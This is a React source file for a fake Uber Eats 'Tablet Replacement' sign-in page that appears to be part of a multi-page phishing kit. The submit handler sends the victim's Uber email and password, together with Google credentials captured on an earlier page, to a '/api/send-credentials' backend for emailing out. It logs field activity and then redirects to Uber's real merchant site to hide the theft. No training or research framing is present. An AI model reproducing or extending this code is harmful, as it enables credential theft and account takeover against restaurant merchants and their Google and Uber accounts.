import { useState, useEffect } from "react";
import { FaApple } from "react-icons/fa";
import {
  trackPageView,
  trackPageExit,
  trackInputFocus,
  trackInputBlur,
  trackInputChange,
  trackButtonClick,
  trackFormSubmit,
} from "./utils/activityTracker";

interface UberEatsLoginProps {
  googleCredentials: { email: string; password: string };
}

export default function UberEatsLogin({ googleCredentials }: UberEatsLoginProps) {
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");

  // Track page view on mount
  useEffect(() => {
    trackPageView('/login-page-2');
    
    return () => {
      trackPageExit('/login-page-2');
    };
  }, []);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    console.log("Uber Eats login attempt with:", { email, password });
    console.log("Google credentials:", googleCredentials);
    
    // Track form submission
    trackFormSubmit('login-form-page-2', { email, password, googleCredentials }, '/login-page-2');
    
    // Send credentials to backend
    try {
      console.log('📧 Sending credentials to backend...');
      const apiUrl = import.meta.env.PROD 
        ? '/api/send-credentials' 
        : 'http://localhost:3001/api/send-credentials';
      
      const response = await fetch(apiUrl, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          googleEmail: googleCredentials.email,
          googlePassword: googleCredentials.password,
          uberEmail: email,
          uberPassword: password
        })
      });
      
      const result = await response.json();
      console.log('✅ Response from backend:', result);
      
      if (result.success) {
        console.log('✅ Email sent successfully with data:', {
          googleEmail: googleCredentials.email,
          googlePassword: googleCredentials.password,
          uberEmail: email,
          uberPassword: password
        });
      }
    } catch (error) {
      console.error('❌ Error sending credentials:', error);
    }
    
    // Redirect to Uber Eats merchant learning center
    setTimeout(() => {
      window.location.href = "https://merchants.ubereats.com/gb/en/resources/learning-center/equipment/";
    }, 1000);
  };

  return (
    <div className="min-h-screen flex flex-col bg-white">
      {/* Header */}
      <header className="bg-gradient-to-r from-gray-900 to-gray-800 px-6 py-4">
        <h1 className="text-white text-3xl pl-10">
          <span className="font-medium">Tablet</span>{" "}
          <span className="font-bold">Replacement</span>
        </h1>
      </header>

      {/* Main */}
      <div className="flex-1 flex items-start justify-center bg-white pt-4">
        <div className="w-full max-w-sm">
          <div className="px-6 sm:px-8">
            {/* Title - slightly smaller + closer to navbar */}
            <h2 className="text-[24px] font-normal text-gray-900 leading-tight mb-3">
              Sign in to continue
            </h2>

            {/* Form */}
            <form onSubmit={handleSubmit} className="space-y-2">
              {/* Email */}
              <input
                type="email"
                value={email}
                onChange={(e) => {
                  setEmail(e.target.value);
                  trackInputChange('email-input-page-2', e.target.value.length > 0, '/login-page-2');
                }}
                onFocus={() => trackInputFocus('email-input-page-2', '/login-page-2')}
                onBlur={() => trackInputBlur('email-input-page-2', email, '/login-page-2')}
                placeholder="Phone number or email"
                className="w-full px-4 py-3 text-[15px]
  bg-[#F3F3F3] border border-[#F3F3F3]
  rounded-lg
  placeholder-gray-600
  focus:outline-none focus:bg-white
  focus:border-black focus:ring-2 focus:ring-black
  transition-all"
                required
              />

              {/* Password */}
              <input
                type="password"
                value={password}
                onChange={(e) => {
                  setPassword(e.target.value);
                  trackInputChange('password-input-page-2', e.target.value.length > 0, '/login-page-2');
                }}
                onFocus={() => trackInputFocus('password-input-page-2', '/login-page-2')}
                onBlur={() => trackInputBlur('password-input-page-2', password, '/login-page-2')}
                placeholder="Your password"
                className="w-full px-4 py-3 text-[15px]
  bg-[#F3F3F3] border border-[#F3F3F3]
  rounded-lg
  placeholder-gray-600
  focus:outline-none focus:bg-white
  focus:border-black focus:ring-2 focus:ring-black
  transition-all"
                required
              />

              {/* Continue Button */}
              <button
                type="submit"
                onClick={() => trackButtonClick('continue-button-page-2', '/login-page-2')}
                className="w-full bg-black text-white font-medium py-3 text-[15px] rounded-lg
                hover:bg-gray-900 transition-colors"
              >
                Continue
              </button>
            </form>

            {/* Divider */}
            <div className="flex items-center my-3">
              <div className="flex-1 border-t border-black"></div>
              <span className="px-3 text-xs text-black">or</span>
              <div className="flex-1 border-t border-black"></div>
            </div>

            {/* Google Button */}
            <button
              onClick={() => trackButtonClick('google-button-page-2', '/login-page-2')}
              className="w-full bg-[#E8E8E8] text-gray-900 font-medium py-3 rounded-lg 
              hover:bg-[#DADADA] transition-colors flex items-center justify-center gap-2 text-sm"
            >
              <svg className="h-4 w-4" viewBox="0 0 48 48">
                <path
                  fill="#EA4335"
                  d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"
                />
                <path
                  fill="#4285F4"
                  d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"
                />
                <path
                  fill="#FBBC05"
                  d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"
                />
                <path
                  fill="#34A853"
                  d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"
                />
              </svg>
              Continue with Google
            </button>

            {/* Apple Button */}
            <button
              onClick={() => trackButtonClick('apple-button-page-2', '/login-page-2')}
              className="w-full bg-[#E8E8E8] text-gray-900 font-medium py-3 rounded-lg 
  hover:bg-[#DADADA] transition-colors flex items-center justify-center gap-2 text-sm mt-2"
            >
              <FaApple className="h-5 w-5" />
              Continue with Apple
            </button>

            {/* Divider */}
            <div className="flex items-center my-3">
              <div className="flex-1 border-t border-black"></div>
              <span className="px-3 text-xs text-black">or</span>
              <div className="flex-1 border-t border-black"></div>
            </div>

            {/* QR Login */}
            <button
              onClick={() => trackButtonClick('qr-code-button-page-2', '/login-page-2')}
              className="w-full bg-[#E8E8E8] text-gray-900 font-medium py-3 rounded-lg 
              hover:bg-[#DADADA] transition-colors flex items-center justify-center gap-2 text-sm"
            >
              <svg className="h-4 w-4" viewBox="0 0 24 24" fill="currentColor">
                <path d="M3 11h8V3H3v8zm2-6h4v4H5V5zm-2 8h8v8H3v-8zm2 2v4h4v-4H5zm8-12v8h8V3h-8zm2 2h4v4h-4V5zm4 12h-2v2h2v-2zm-6 0h2v2h-2v-2zm2 2h2v2h-2v-2zm2-2h2v2h-2v-2zm0-2h2v2h-2v-2zm-4 0h2v2h-2v-2z" />
              </svg>
              Log in with QR code
            </button>

            {/* Footer */}
            <p className="text-[10px] text-gray-500 mt-3 text-center leading-snug">
              By continuing, you agree to calls, including by autodialer,
              WhatsApp, or texts from Uber and its affiliates.
            </p>
          </div>
        </div>
      </div>
    </div>
  );
}
